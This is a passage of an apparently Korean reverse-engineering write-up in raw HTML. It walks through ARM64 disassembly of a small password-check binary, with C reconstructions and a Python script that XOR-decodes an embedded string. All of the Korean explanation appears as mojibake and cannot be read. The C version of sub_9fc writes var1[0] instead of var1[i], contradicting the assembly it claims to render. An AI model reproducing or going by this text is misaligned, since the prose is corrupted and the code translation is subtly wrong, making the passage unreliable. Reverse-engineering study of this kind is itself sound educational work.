class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">9ec</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">95</span>    bl  <span class="hljs-number">840</span> &lt;strcpy@plt&gt; <span class="hljs-attribute">9f0</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">9f4</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">37</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #48</span><span class="hljs-meta"> 9f8:   d65f03c0    ret</span></code></pre><p><code>sub_ab8</code>ì—ì„œ ë°˜í™˜í•œ ë¬¸ìì—´ì„ ë°›ì•„ì„œ ê¸¸ì´ë¥¼ ê³„ì‚°í•œ í›„ <code>malloc</code> í•´ì¤ë‹ˆë‹¤. í• ë‹¹í•œ ì£¼ì†Œê°€ 0ì´ë¼ë©´ 0ì„ ë°˜í™˜í•´ì£¼ê³ , ì•„ë‹ˆë©´ <code>strcpy</code>ë¥¼ í†µí•´ <code>sub_ab8</code>ì—ì„œ ì˜¨ ë¬¸ìì—´ì„ ë³µì‚¬í•˜ì—¬ return í•´ì¤ë‹ˆë‹¤.</p><p>ì´ì œ <code>sub_9fc</code> í•¨ìˆ˜ë¥¼ ë¶„ì„ì„ í•´ë´…ì‹œë‹¤.</p><pre><code class="hljs apache"><span class="hljs-attribute">00000000000009fc</span> &lt;sub_<span class="hljs-number">9</span>fc&gt;: <span class="hljs-attribute">9fc</span>:   a<span class="hljs-number">9</span>bc<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-64]!</span><span class="hljs-meta"> a00:   910003fd    mov x29, sp</span><span class="hljs-meta"> a04:   f90017e0    str x0, [sp, #40]</span> <span class="hljs-attribute">a08</span>:   b<span class="hljs-number">90027</span>e<span class="hljs-number">1</span>    str w<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #36]</span> <span class="hljs-attribute">a0c</span>:   f<span class="hljs-number">9000</span>fe<span class="hljs-number">2</span>    str x<span class="hljs-number">2</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">a10</span>:   b<span class="hljs-number">90023</span>e<span class="hljs-number">3</span>    str w<span class="hljs-number">3</span>,<span class="hljs-meta"> [sp, #32]</span> <span class="hljs-attribute">a14</span>:   b<span class="hljs-number">94027</span>e<span class="hljs-number">0</span>    ldr w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #36]</span> <span class="hljs-attribute">a18</span>:   <span class="hljs-number">11000400</span>    add w<span class="hljs-number">0</span>, w<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span> <span class="hljs-attribute">a1c</span>:   <span class="hljs-number">93407</span>c<span class="hljs-number">00</span>    sxtw    x<span class="hljs-number">0</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">a20</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">68</span>    bl  <span class="hljs-number">7</span>c<span class="hljs-number">0</span> &lt;malloc@plt&gt; <span class="hljs-attribute">a24</span>:   f<span class="hljs-number">9001</span>fe<span class="hljs-number">0</span>    str x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #56]</span> <span class="hljs-attribute">a28</span>:   b<span class="hljs-number">98027</span>e<span class="hljs-number">0</span>    ldrsw   x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #36]</span> <span class="hljs-attribute">a2c</span>:   f<span class="hljs-number">9401</span>fe<span class="hljs-number">1</span>    ldr x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #56]</span> <span class="hljs-attribute">a30</span>:   <span class="hljs-number">8</span>b<span class="hljs-number">000020</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">1</span>, x<span class="hljs-number">0</span> <span class="hljs-attribute">a34</span>:   <span class="hljs-number">3900001</span>f    strb    wzr,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">a38</span>:   b<span class="hljs-number">90037</span>ff    str wzr,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a3c</span>:   <span class="hljs-number">14000018</span>    b   a<span class="hljs-number">9</span>c &lt;sub_<span class="hljs-number">9</span>fc+<span class="hljs-number">0</span>xa<span class="hljs-number">0</span>&gt; <span class="hljs-attribute">a40</span>:   b<span class="hljs-number">98037</span>e<span class="hljs-number">0</span>    ldrsw   x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a44</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">1</span>    ldr x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">a48</span>:   <span class="hljs-number">8</span>b<span class="hljs-number">000020</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">1</span>, x<span class="hljs-number">0</span> <span class="hljs-attribute">a4c</span>:   <span class="hljs-number">39400002</span>    ldrb    w<span class="hljs-number">2</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">a50</span>:   b<span class="hljs-number">94037</span>e<span class="hljs-number">0</span>    ldr w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a54</span>:   b<span class="hljs-number">94023</span>e<span class="hljs-number">1</span>    ldr w<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #32]</span> <span class="hljs-attribute">a58</span>:   <span class="hljs-number">1</span>ac<span class="hljs-number">10</span>c<span class="hljs-number">03</span>    sdiv    w<span class="hljs-number">3</span>, w<span class="hljs-number">0</span>, w<span class="hljs-number">1</span> <span class="hljs-attribute">a5c</span>:   b<span class="hljs-number">94023</span>e<span class="hljs-number">1</span>    ldr w<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #32]</span> <span class="hljs-attribute">a60</span>:   <span class="hljs-number">1</span>b<span class="hljs-number">017</span>c<span class="hljs-number">61</span>    mul w<span class="hljs-number">1</span>, w<span class="hljs-number">3</span>, w<span class="hljs-number">1</span> <span class="hljs-attribute">a64</span>:   <span class="hljs-number">4</span>b<span class="hljs-number">010000</span>    sub w<span class="hljs-number">0</span>, w<span class="hljs-number">0</span>, w<span class="hljs-number">1</span> <span class="hljs-attribute">a68</span>:   <span class="hljs-number">93407</span>c<span class="hljs-number">00</span>    sxtw    x<span class="hljs-number">0</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">a6c</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">1</span>    ldr x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">a70</span>:   <span class="hljs-number">8</span>b<span class="hljs-number">000020</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">1</span>, x<span class="hljs-number">0</span> <span class="hljs-attribute">a74</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">a78</span>:   b<span class="hljs-number">98037</span>e<span class="hljs-number">0</span>    ldrsw   x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a7c</span>:   f<span class="hljs-number">9401</span>fe<span class="hljs-number">3</span>    ldr x<span class="hljs-number">3</span>,<span class="hljs-meta"> [sp, #56]</span> <span class="hljs-attribute">a80</span>:   <span class="hljs-number">8</span>b<span class="hljs-number">000060</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">3</span>, x<span class="hljs-number">0</span> <span class="hljs-attribute">a84</span>:   <span class="hljs-number">4</span>a<span class="hljs-number">010041</span>    eor w<span class="hljs-number">1</span>, w<span class="hljs-number">2</span>, w<span class="hljs-number">1</span> <span class="hljs-attribute">a88</span>:   <span class="hljs-number">12001</span>c<span class="hljs-number">21</span>    and w<span class="hljs-number">1</span>, w<span class="hljs-number">1</span>, #<span class="hljs-number">0</span>xff <span class="hljs-attribute">a8c</span>:   <span class="hljs-number">39000001</span>    strb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">a90</span>:   b<span class="hljs-number">94037</span>e<span class="hljs-number">0</span>    ldr w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a94</span>:   <span class="hljs-number">11000400</span>    add w<span class="hljs-number">0</span>, w<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span> <span class="hljs-attribute">a98</span>:   b<span class="hljs-number">90037</span>e<span class="hljs-number">0</span>    str w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a9c</span>:   b<span class="hljs-number">94037</span>e<span class="hljs-number">1</span>    ldr w<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">aa0</span>:   b<span class="hljs-number">94027</span>e<span class="hljs-number">0</span>    ldr w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #36]</span> <span class="hljs-attribute">aa4</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">aa8</span>:   <span class="hljs-number">54</span>fffccb    b.lt    a<span class="hljs-number">40</span> &lt;sub_<span class="hljs-number">9</span>fc+<span class="hljs-number">0</span>x<span class="hljs-number">44</span>&gt;  // b.tstop <span class="hljs-attribute">aac</span>:   f<span class="hljs-number">9401</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #56]</span> <span class="hljs-attribute">ab0</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">47</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #64</span><span class="hljs-meta"> ab4:   d65f03c0    ret</span></code></pre><p>ì¸ìë¡œ ë°›ì€ ê°’ì„ ì°¨ë¡€ëŒ€ë¡œ ìŠ¤íƒì— ì €ì¥í•©ë‹ˆë‹¤. <code>w1</code>ê³¼ <code>w3</code>ì€ ë°ì´í„°ì˜ ê¸¸ì´ë¡œ ì¶”ì •ë˜ë¯€ë¡œ <code>x0</code>, <code>x2</code>ì— ë“¤ì–´ì˜¨ ê°’ì„ ë³´ë©´ <code>[sp + #40] = \xFC\x7F\x65\x79\xFF\x73\x6C\x7D\xF4\x77\x6D\x61\xE7\x6B\x74\x65\xEC\x6F\x75\x69\xEF\x63\x46\x53\xDA\x5D\x47\x57\xD1\x51\x4E\x5B\xD2\x55\x4F\x5F\xD9\x49\x56\x43\xCA\x4D\x57\x47\xC1\x41\x5E\x4B\xA9\x28\x30\x22\xA2\x2C\x31\x26\xA1\x20</code>, <code>[sp + #24] = \x96\x19\x7\x11\x99\x19\x2\x11</code> ì´ ë©ë‹ˆë‹¤. ìŠ¤íƒì— ê°’ì„ ì €ì¥í•œ í›„ ì²« ë²ˆì§¸ ì¸ìì˜ ê¸¸ì´+1 ë§Œí¼ <code>malloc</code>ì„ í•´ì¤€ í›„ <code>sp+#56</code>ì— ì €ì¥í•©ë‹ˆë‹¤. ê·¸ í›„ ì²« ë²ˆì§¸ ì¸ìì˜ ê¸¸ì´ë¥¼ ê°€ì ¸ì™€ì„œ <code>malloc</code>í•œ ì£¼ì†Œì˜ ë§ˆì§€ë§‰ indexì— 0x0ì„ ë„£ì–´ì£¼ê³  <code>sp+#52</code>ì— 0ì„ ì €ì¥í•´ì¤€ í›„ <code>a9c</code>ë¡œ ì´ë™í•©ë‹ˆë‹¤.</p><p><code>a9c</code>ì—ì„œëŠ” 0ì„ <code>w1</code>ì— ë„£ê³  ì²« ë²ˆì§¸ ë¬¸ìì—´ì˜ ê¸¸ì´ë¥¼ <code>w0</code>ì— ë¶ˆëŸ¬ì˜¨ í›„ ë‘ ê°œë¥¼ ë¹„êµí•˜ì—¬ <code>a40</code>ìœ¼ë¡œ ì´ë™í•©ë‹ˆë‹¤. <code>w1=w0</code>ì´ ë˜ë©´ <code>flag</code>ê°€ <code>0</code>ìœ¼ë¡œ ì„¸íŒ…ë˜ê³  <code>b.lt</code> ì—°ì‚°ì´ ìˆ˜í–‰ë˜ì§€ ì•Šìœ¼ë¯€ë¡œ ì²« ë²ˆì§¸ ë¬¸ìì—´ì˜ ê¸¸ì´ë§Œí¼ ë°˜ë³µí•˜ëŠ” êµ¬ê°„ì„ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. <code>a40</code>ì—ì„œ <code>[sp+#40 + sp+#52]</code>ì˜ ê°’ì„ <code>w2</code>ì— ë„£ê³  <code>w3</code>ì—ëŠ” <code>sp+#52 - sp+#32 * (sp+#52 / sp+#32)</code> ì—°ì‚°ì„ í†µí•´ <code>sp+#52 % sp+#32</code> ë¥¼ ìˆ˜í–‰í•œ í›„ í•´ë‹¹ ì£¼ì†Œì˜ ê°’ì„ ê°€ì ¸ì™€ì„œ ë‘ ë¬¸ìì—´ì„ <code>xor</code> ì—°ì‚°í•©ë‹ˆë‹¤.</p><p><code>sub_9fc</code> ë¥¼ cë¡œ ê°„ë‹¨í•˜ê²Œ ë‚˜íƒ€ë‚´ë©´ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-comment">// sub_9fc</span><span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">sub_9fc</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* param1, <span class="hljs-keyword">int</span> param2, <span class="hljs-keyword">char</span>* param3, <span class="hljs-keyword">int</span> param4)</span></span><span class="hljs-function"></span>&#123; Â  Â <span class="hljs-keyword">char</span>* var1 = <span class="hljs-built_in">malloc</span>(param2 + <span class="hljs-number">1</span>); Â  Â var1[param2] = <span class="hljs-string">&#x27;\0&#x27;</span>; Â  Â <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; param2; i++) Â   &#123; Â  Â  Â  Â var1[<span class="hljs-number">0</span>] = (param1[i] ^ param3[i % param4]) &amp; <span class="hljs-number">0xff</span>; Â   &#125; Â  Â <span class="hljs-keyword">return</span> var1;&#125;</code></pre><p>í•´ë‹¹ ë¬¸ìì—´ë“¤ì´ <code>sub_9fc</code>ë¥¼ ê±°ì³ ì–´ë– í•œ ê°’ì´ ë‚˜ì˜¤ëŠ”ì§€ êµ¬í•˜ëŠ” python ìŠ¤í¬ë¦½íŠ¸ëŠ” ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs python">string1 = [ Â  Â <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xFF</span>, Â  Â <span class="hljs-number">0x73</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x65</span>, Â  Â <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x47</span>, Â  Â <span class="hljs-number">0x57</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x56</span>, Â  Â <span class="hljs-number">0x43</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x30</span>, Â  Â <span class="hljs-number">0x22</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x20</span>]string2 = [<span class="hljs-number">0x96</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x11</span>]result = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(string1)): Â  Â result += chr(string1[i] ^ string2[i % len(string2)])print(result)<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">C:\Users\idioth\Desktop&gt;lock.py</span><span class="hljs-string">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</span><span class="hljs-string">&#x27;&#x27;&#x27;</span></code></pre><p><code>sub_9fc</code>ê¹Œì§€ ë§ˆì³¤ìœ¼ë‹ˆ ë‹¤ì‹œ mainìœ¼ë¡œ ëŒì•„ê°€ì£ !</p><pre><code class="hljs c"><span class="hljs-comment">// main</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123; Â  Â <span class="hljs-keyword">char</span> *var1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x13</span>, <span class="hljs-number">1</span>); Â  Â <span class="hljs-keyword">int</span> var2 = sub_9b0(sub_ab8()); Â  Â sub_96c(); Â  Â <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, var1); Â  Â sub_b30(var1, var2); Â  Â <span class="hljs-built_in">free</span>(var1); Â  Â <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>ì´ì œ ì…ë ¥ ê°’ì„ ë°›ì•„ì„œ <code>sub_b30</code>í•˜ëŠ” ê²ƒë§Œ ë‚¨ì•˜ë„¤ìš”. <code>sub_b30</code> í•¨ìˆ˜ë¥¼ í™•ì¸í•´ë´…ì‹œë‹¤.</p><pre><code class="hljs apache"><span class="hljs-attribute">0000000000000b30</span> &lt;sub_b<span class="hljs-number">30</span>&gt;: <span class="hljs-attribute">b30</span>:   a<span class="hljs-number">9</span>be<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-32]!</span><span class="hljs-meta"> b34:   910003fd    mov x29, sp</span><span class="hljs-meta"> b38:   f9000fe0    str x0, [sp, #24]</span> <span class="hljs-attribute">b3c</span>:   f<span class="hljs-number">9000</span>be<span class="hljs-number">1</span>    str x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">b40</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">b44</span>:   <span class="hljs-number">91001800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">6</span> <span class="hljs-attribute">b48</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b4c</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">b50</span>:   <span class="hljs-number">91003800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xe <span class="hljs-attribute">b54</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b58</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">b5c</span>:   <span class="hljs-number">54000761</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">b60</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">b64</span>:   <span class="hljs-number">91001000</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">4</span> <span class="hljs-attribute">b68</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b6c</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">b70</span>:   <span class="hljs-number">91000</span>c<span class="hljs-number">00</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">3</span> <span class="hljs-attribute">b74</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b78</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">b7c</span>:   <span class="hljs-number">54000661</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">b80</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">b84</span>:   <span class="hljs-number">91000</span>c<span class="hljs-number">00</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">3</span> <span class="hljs-attribute">b88</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b8c</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">b90</span>:   <span class="hljs-number">91002800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xa <span class="hljs-attribute">b94</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b98</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">b9c</span>:   <span class="hljs-number">54000561</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">ba0</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">ba4</span>:   <span class="hljs-number">91001</span>c<span class="hljs-number">00</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">7</span> <span class="hljs-attribute">ba8</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bac</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">bb0</span>:   <span class="hljs-number">91004400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">11</span> <span class="hljs-attribute">bb4</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bb8</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">bbc</span>:   <span class="hljs-number">54000461</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">bc0</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">bc4</span>:   <span class="hljs-number">91000400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span> <span class="hljs-attribute">bc8</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bcc</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">bd0</span>:   <span class="hljs-number">91003800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xe <span class="hljs-attribute">bd4</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bd8</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">bdc</span>:   <span class="hljs-number">54000361</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">be0</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">be4</span>:   <span class="hljs-number">91001400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">5</span> <span class="hljs-attribute">be8</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bec</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">bf0</span>:   <span class="hljs-number">9100</span>d<span class="hljs-number">000</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">34</span> <span class="hljs-attribute">bf4</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bf8</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">bfc</span>:   <span class="hljs-number">54000261</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">c00</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">c04</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">c08</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">c0c</span>:   <span class="hljs-number">9100</span>d<span class="hljs-number">400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">35</span> <span class="hljs-attribute">c10</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">c14</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">c18</span>:   <span class="hljs-number">54000181</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span 